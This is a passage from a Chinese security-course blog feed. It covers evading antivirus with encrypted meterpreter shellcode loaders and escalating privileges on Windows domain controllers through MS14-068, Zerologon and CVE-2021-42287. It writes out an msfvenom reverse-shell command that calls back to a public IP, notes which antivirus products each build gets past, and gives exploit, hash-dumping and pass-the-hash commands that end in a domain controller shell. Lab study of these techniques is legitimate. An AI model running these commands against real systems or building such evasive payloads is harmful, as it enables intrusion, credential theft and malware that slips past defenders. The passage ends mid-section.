title="编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些"></a>编译生成exe，一开始生成了32位的被杀了，后面选择生成64位的一开始没有查杀（后面被杀了），可能32位的容易被查杀一些</h6><h6 id="某绒没有查杀"><a href="#某绒没有查杀" class="headerlink" title="某绒没有查杀"></a>某绒没有查杀</h6><h6 id="x60后面查杀了"><a href="#x60后面查杀了" class="headerlink" title="x60后面查杀了"></a>x60后面查杀了</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427145340847.png" alt="image-20230427145340847"></p><h5 id="2、AES加密：python2-shellcode-encoder-py-cpp-cs-py-shellcode-raw-xiaodi-aes（还是网上的脚本shellcode-encoder-py）"><a href="#2、AES加密：python2-shellcode-encoder-py-cpp-cs-py-shellcode-raw-xiaodi-aes（还是网上的脚本shellcode-encoder-py）" class="headerlink" title="2、AES加密：python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes（还是网上的脚本shellcode_encoder.py）"></a>2、AES加密：python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes（还是网上的脚本shellcode_encoder.py）</h5><h6 id="只过了某绒"><a href="#只过了某绒" class="headerlink" title="只过了某绒"></a>只过了某绒</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151132433.png" alt="image-20230427151132433"></p><h5 id="3、Hex加密"><a href="#3、Hex加密" class="headerlink" title="3、Hex加密"></a>3、Hex加密</h5><h5 id="msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c"><a href="#msfvenom-p-windows-x2F-meterpreter-x2F-reverse-tcp-lhost-x3D-47-94-236-117-lport-x3D-6688-f-c" class="headerlink" title="msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c"></a>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c</h5><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>项目地址：<a href="https://github.com/ByPassAVTeam/ShellcodeLoader">https://github.com/ByPassAVTeam/ShellcodeLoader</a></p><h5 id="LoaderMaker-exe-download-dat-hex数据-xiaodi-exe-生成文件名"><a href="#LoaderMaker-exe-download-dat-hex数据-xiaodi-exe-生成文件名" class="headerlink" title="LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)"></a>LoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)</h5><h6 id="msf生成"><a href="#msf生成" class="headerlink" title="msf生成"></a>msf生成</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151523596.png" alt="image-20230427151523596"></p><h6 id="将代码去掉-x2F-和空格，到处为dat文件"><a href="#将代码去掉-x2F-和空格，到处为dat文件" class="headerlink" title="将代码去掉&#x2F;和空格，到处为dat文件"></a>将代码去掉&#x2F;和空格，到处为dat文件</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151854119.png" alt="image-20230427151854119"></p><h6 id="在其项目内执行-LoaderMaker-exe-download-dat-hex数据-xxddd-exe-生成文件名"><a href="#在其项目内执行-LoaderMaker-exe-download-dat-hex数据-xxddd-exe-生成文件名" class="headerlink" title="在其项目内执行:LoaderMaker.exe   download.dat(hex数据)    xxddd.exe(生成文件名)"></a>在其项目内执行:LoaderMaker.exe   download.dat(hex数据)    xxddd.exe(生成文件名)</h6><h6 id="可过某绒"><a href="#可过某绒" class="headerlink" title="可过某绒"></a>可过某绒</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427151946589.png" alt="image-20230427151946589"></p><h5 id="4、Rc4加密（比其他更加复杂，加密强度大）"><a href="#4、Rc4加密（比其他更加复杂，加密强度大）" class="headerlink" title="4、Rc4加密（比其他更加复杂，加密强度大）"></a>4、Rc4加密（比其他更加复杂，加密强度大）</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c </p><p><a href="https://blog.csdn.net/weixin_45590789/article/details/105536623">https://blog.csdn.net/weixin_45590789/article/details/105536623</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152245386.png" alt="image-20230427152245386"></p><h6 id="填入后点击本地调试，会将shellcode进行Rc4加密"><a href="#填入后点击本地调试，会将shellcode进行Rc4加密" class="headerlink" title="填入后点击本地调试，会将shellcode进行Rc4加密"></a>填入后点击本地调试，会将shellcode进行Rc4加密</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152513620.png" alt="image-20230427152513620"></p><h6 id="会自动弹出窗口"><a href="#会自动弹出窗口" class="headerlink" title="会自动弹出窗口"></a>会自动弹出窗口</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152605327.png" alt="image-20230427152605327"></p><h6 id="将上面的内容再次替换刚才的"><a href="#将上面的内容再次替换刚才的" class="headerlink" title="将上面的内容再次替换刚才的"></a>将上面的内容再次替换刚才的</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152730636.png" alt="image-20230427152730636"></p><h6 id="编译成exe后，过了某绒、defender、但是还是没有过某60"><a href="#编译成exe后，过了某绒、defender、但是还是没有过某60" class="headerlink" title="编译成exe后，过了某绒、defender、但是还是没有过某60"></a>编译成exe后，过了某绒、defender、但是还是没有过某60</h6><h3 id="C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等"><a href="#C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等" class="headerlink" title="#C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等"></a>#C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</h3><p>Callback_Shellcode_Injection-main</p><p><a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Day106 权限提升-WIN系统&amp;AD域控&amp;NetLogon&amp;ADCS&amp;PAC&amp;KDC&amp;CVE漏洞</title>
    <link href="http://example.com/2023/04/17/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/04/17/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-04-17T02:38:02.000Z</published>
    <updated>2023-04-26T17:09:38.281Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是域控？"><a href="#什么是域控？" class="headerlink" title="什么是域控？"></a>什么是域控？</h2><blockquote><h4 id="域控指的就是域控制器（Domain-Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active-Directory，AD）。"><a href="#域控指的就是域控制器（Domain-Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active-Directory，AD）。" class="headerlink" title="域控指的就是域控制器（Domain Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active Directory，AD）。"></a>域控指的就是域控制器（Domain Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a>之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active Directory，AD）。</h4></blockquote><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、WIN-域控提权-CVE-2014-6324</p><p>2、WIN-域控提权-CVE-2020-1472</p><p>3、WIN-域控提权-CVE-2021-42287</p><p>4、WIN-域控提权-CVE-2022-26923</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><h3 id="域控漏洞："><a href="#域控漏洞：" class="headerlink" title="域控漏洞："></a>域控漏洞：</h3><p>WIN-域控提权-CVE-2014-6324</p><p>WIN-域控提权-CVE-2020-1472</p><p>WIN-域控提权-CVE-2021-42287</p><p>WIN-域控提权-CVE-2022-26923</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-WIN-域控提权-CVE-2014-6324"><a href="#➢-WIN-域控提权-CVE-2014-6324" class="headerlink" title="➢ WIN-域控提权-CVE-2014-6324"></a>➢ WIN-域控提权-CVE-2014-6324</h4><h4 id="➢-WIN-域控提权-CVE-2020-1472"><a href="#➢-WIN-域控提权-CVE-2020-1472" class="headerlink" title="➢ WIN-域控提权-CVE-2020-1472"></a>➢ WIN-域控提权-CVE-2020-1472</h4><h4 id="➢-WIN-域控提权-CVE-2021-42287"><a href="#➢-WIN-域控提权-CVE-2021-42287" class="headerlink" title="➢ WIN-域控提权-CVE-2021-42287"></a>➢ WIN-域控提权-CVE-2021-42287</h4><h4 id="➢-WIN-域控提权-CVE-2022-26923"><a href="#➢-WIN-域控提权-CVE-2022-26923" class="headerlink" title="➢ WIN-域控提权-CVE-2022-26923"></a>➢ WIN-域控提权-CVE-2022-26923</h4></blockquote><h3 id="WIN-域控提权-CVE-2014-6324"><a href="#WIN-域控提权-CVE-2014-6324" class="headerlink" title="#WIN-域控提权-CVE-2014-6324"></a>#WIN-域控提权-CVE-2014-6324</h3><h5 id="MS14-068-CVE-2014-6324-域用户提权漏洞-ms14-068-exe-h领小白帽的博客-CSDN博客"><a href="#MS14-068-CVE-2014-6324-域用户提权漏洞-ms14-068-exe-h领小白帽的博客-CSDN博客" class="headerlink" title="MS14-068 (CVE-2014-6324)域用户提权漏洞_ms14-068.exe_h领小白帽的博客-CSDN博客"></a><a href="https://blog.csdn.net/weixin_46944519/article/details/123498421">MS14-068 (CVE-2014-6324)域用户提权漏洞_ms14-068.exe_h领小白帽的博客-CSDN博客</a></h5><h5 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h5><h5 id="1、需要域用户账号密码"><a href="#1、需要域用户账号密码" class="headerlink" title="1、需要域用户账号密码"></a>1、需要域用户账号密码</h5><h5 id="2、一台主机的管理员权限"><a href="#2、一台主机的管理员权限" class="headerlink" title="2、一台主机的管理员权限"></a>2、一台主机的管理员权限</h5><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425153419918.png" alt="image-20230425153419918"></p><ul><li><h6 id="1、whoami-x2F-user"><a href="#1、whoami-x2F-user" class="headerlink" title="1、whoami &#x2F;user"></a>1、whoami &#x2F;user</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152618574.png" alt="image-20230425152618574"></p></li><li><h6 id="2、net-time-x2F-domain"><a href="#2、net-time-x2F-domain" class="headerlink" title="2、net time &#x2F;domain"></a>2、net time &#x2F;domain</h6></li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152034308.png" alt="image-20230425152034308"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152508661.png" alt="image-20230425152508661"></p><ul><li><h6 id="3、net-config-workstation"><a href="#3、net-config-workstation" class="headerlink" title="3、net config workstation"></a>3、net config workstation</h6></li><li><h6 id="4、ms14-068-exe-u-域成员名-域名-p-域成员密码-s-域成员sid-d-域控制器地址"><a href="#4、ms14-068-exe-u-域成员名-域名-p-域成员密码-s-域成员sid-d-域控制器地址" class="headerlink" title="4、ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址"></a>4、ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</h6><p>ms14-068.exe -u <a href="mailto:&#109;&#x61;&#x72;&#x79;&#64;&#103;&#x6f;&#100;&#x2e;&#x6f;&#x72;&#x67;">&#109;&#x61;&#x72;&#x79;&#64;&#103;&#x6f;&#100;&#x2e;&#x6f;&#x72;&#x67;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org（对应上面填写）</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155151454.png" alt="image-20230425155151454"></p><h6 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155515902.png" alt="image-20230425155515902"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155556830.png" alt="image-20230425155556830"></p><h6 id="将此文件复制到minikatz目录"><a href="#将此文件复制到minikatz目录" class="headerlink" title="将此文件复制到minikatz目录"></a>将此文件复制到minikatz目录</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160405403.png" alt="image-20230425160405403"></p></li><li><h6 id="5、启用minicatz"><a href="#5、启用minicatz" class="headerlink" title="5、启用minicatz"></a>5、启用minicatz</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155726349.png" alt="image-20230425155726349"></p></li><li><h6 id="minikatz执行"><a href="#minikatz执行" class="headerlink" title="minikatz执行"></a>minikatz执行</h6></li><li><p>kerberos::list（查看票据列表）</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160124484.png" alt="image-20230425160124484"></p></li><li><p>kerberos::purge  (清除票据)</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155900065.png" alt="image-20230425155900065"></p></li><li><p>kerberos::ptc “<a href="mailto:&#x54;&#x47;&#x54;&#x5f;&#x74;&#101;&#x73;&#x74;&#x30;&#50;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#108;&#x61;&#x62;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#x65;">&#x54;&#x47;&#x54;&#x5f;&#x74;&#101;&#x73;&#x74;&#x30;&#50;&#x40;&#x74;&#x65;&#x73;&#116;&#x2e;&#108;&#x61;&#x62;&#x2e;&#99;&#99;&#97;&#x63;&#104;&#x65;</a>“</p></li><li><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160519125.png" alt="image-20230425160519125"></p></li><li><h6 id="5、再次查看域控的C盘目录"><a href="#5、再次查看域控的C盘目录" class="headerlink" title="5、再次查看域控的C盘目录"></a>5、再次查看域控的C盘目录</h6><p>dir \OWA2010CN-God.god.org\C$</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160733043.png" alt="image-20230425160733043"></p></li><li><h6 id="7、使用PsExec工具获取域控shell-x2F-x2F-如果不行就PsExec64-exe以管理员权限运行连接域控"><a href="#7、使用PsExec工具获取域控shell-x2F-x2F-如果不行就PsExec64-exe以管理员权限运行连接域控" class="headerlink" title="7、使用PsExec工具获取域控shell &#x2F;&#x2F;如果不行就PsExec64.exe以管理员权限运行连接域控"></a>7、使用PsExec工具获取域控shell &#x2F;&#x2F;如果不行就PsExec64.exe以管理员权限运行连接域控</h6></li><li><p>psexec \OWA2010CN-God.god.org cmd</p></li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160924426.png" alt="image-20230425160924426"></p><ul><li>ipconfig的ip显示的是域控的ip</li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425161121625.png" alt="image-20230425161121625"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425161100893.png" alt="image-20230425161100893"></p><h3 id="WIN-域控提权-CVE-2020-1472"><a href="#WIN-域控提权-CVE-2020-1472" class="headerlink" title="#WIN-域控提权-CVE-2020-1472"></a>#WIN-域控提权-CVE-2020-1472</h3><p>CVE-2020-1472是继MS17010之后好用的NetLogon特权域控提权漏洞，</p><p>影响Windows Server 2008R2至Windows Server 2019的多个版本系统，</p><p>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</p><p>该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</p><h5 id="1、获取计算机名：nbtscan-v-h-192-168-3-21"><a href="#1、获取计算机名：nbtscan-v-h-192-168-3-21" class="headerlink" title="1、获取计算机名：nbtscan -v -h 192.168.3.21"></a>1、获取计算机名：nbtscan -v -h 192.168.3.21</h5><h5 id="2、漏洞检测：python3-zerologon-tester-py-OWA2010CN-GOD-192-168-3-21"><a href="#2、漏洞检测：python3-zerologon-tester-py-OWA2010CN-GOD-192-168-3-21" class="headerlink" title="2、漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21"></a>2、漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</h5><h5 id="3、重置为空密码：python3-cve-2020-1472-exploit-py-OWA2010CN-GOD-192-168-3-21"><a href="#3、重置为空密码：python3-cve-2020-1472-exploit-py-OWA2010CN-GOD-192-168-3-21" class="headerlink" title="3、重置为空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21"></a>3、重置为空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</h5><h5 id="4、连接后导出hash：python3-secretsdump-py-god-org-x2F-OWA2010CN-GOD-192-168-3-21-no-pass"><a href="#4、连接后导出hash：python3-secretsdump-py-god-org-x2F-OWA2010CN-GOD-192-168-3-21-no-pass" class="headerlink" title="4、连接后导出hash：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass"></a>4、连接后导出hash：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass</h5><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140558083.png" alt="image-20230425140558083"></p><h6 id="可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的"><a href="#可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的" class="headerlink" title="可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的"></a>可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的<img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425141017289.png" alt="image-20230425141017289"></h6><h5 id="5、WMI连接反弹：python3-wmiexec-py-god-x2F-x61-x64-x6d-x69-110-105-x73-116-x72-97-x74-x6f-114-64-49-57-50-x2e-x31-54-x38-46-51-46-50-x31-hashes-aad3b435b51404eeaad3b435b51404ee-ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god-x2F-administrator前的god）"><a href="#5、WMI连接反弹：python3-wmiexec-py-god-x2F-x61-x64-x6d-x69-110-105-x73-116-x72-97-x74-x6f-114-64-49-57-50-x2e-x31-54-x38-46-51-46-50-x31-hashes-aad3b435b51404eeaad3b435b51404ee-ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god-x2F-administrator前的god）" class="headerlink" title="5、WMI连接反弹：python3 wmiexec.py god&#x2F;&#x61;&#x64;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#46;&#50;&#x31; -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god&#x2F;administrator前的god）"></a>5、WMI连接反弹：python3 wmiexec.py god&#x2F;<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#46;&#50;&#x31;">&#x61;&#x64;&#x6d;&#x69;&#110;&#105;&#x73;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#51;&#46;&#50;&#x31;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god&#x2F;administrator前的god）</h5><h3 id="WIN-域控提权-CVE-2021-42287"><a href="#WIN-域控提权-CVE-2021-42287" class="headerlink" title="#WIN-域控提权-CVE-2021-42287"></a>#WIN-域控提权-CVE-2021-42287</h3><p><a href="https://cloud.tencent.com/developer/article/2097964">CVE-2021-42287 CVE-2021-42278域提权漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>只需要域用户账号密码</p><p>脚本地址：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>python3 sam_the_admin.py 域名字&#x2F;域用户 :’域用户密码’ -dc-ip 域控ip地址 -shell</p><p>python3 sam_the_admin.py god&#x2F;‘mary:admin!@#45’ -dc-ip 192.168.3.21 -shell</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140032663.png" alt="image-20230425140032663"></p><h6 id="获得system权限"><a href="#获得system权限" class="headerlink" title="获得system权限"></a>获得system权限</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140113254.png" alt="image-20230425140113254"></p><h3 id="WIN-域控提权-CVE-2022-26923"><a href="#WIN-域控提权-CVE-2022-26923" class="headerlink" title="#WIN-域控提权-CVE-2022-26923"></a>#WIN-域控提权-CVE-2022-26923</h3><h5 id="前提条件：-1"><a href="#前提条件：-1" class="headerlink" title="前提条件："></a>前提条件：</h5><h5 id="1、一个域内普通账号"><a href="#1、一个域内普通账号" class="headerlink" title="1、一个域内普通账号"></a>1、一个域内普通账号</h5><h5 id="2、域内存在证书服务器"><a href="#2、域内存在证书服务器" class="headerlink" title="2、域内存在证书服务器"></a>2、域内存在证书服务器<img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425145804131.png" alt="image-20230425145804131"></h5><h5 